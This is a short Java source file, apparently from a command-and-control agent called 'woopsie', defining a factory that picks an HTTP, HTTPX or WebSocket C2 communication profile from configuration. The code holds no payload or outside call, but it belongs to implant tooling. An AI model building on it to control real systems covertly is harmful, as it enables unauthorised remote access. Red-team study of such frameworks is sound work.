package com.woopsie.profiles;

import com.woopsie.Config;

/**
 * Factory for creating C2 profiles based on configuration
 */
public class ProfileFactory {
    
    /**
     * Create a C2 profile based on the configuration
     * @param config Agent configuration
     * @return C2Profile instance
     * @throws Exception if profile type is unsupported
     */
    public static C2Profile createProfile(Config config) throws Exception {
        String profileType = config.getProfile();
        
        Config.debugLog(config, "Creating profile: " + profileType);
        
        switch (profileType.toLowerCase()) {
            case "http":
                return new HttpProfile(config);
            case "httpx":
                return new HttpxProfile(config);
            case "websocket":
                return new WebSocketProfile(config);
            default:
                throw new Exception("Unsupported profile type: " + profileType);
        }
    }
}
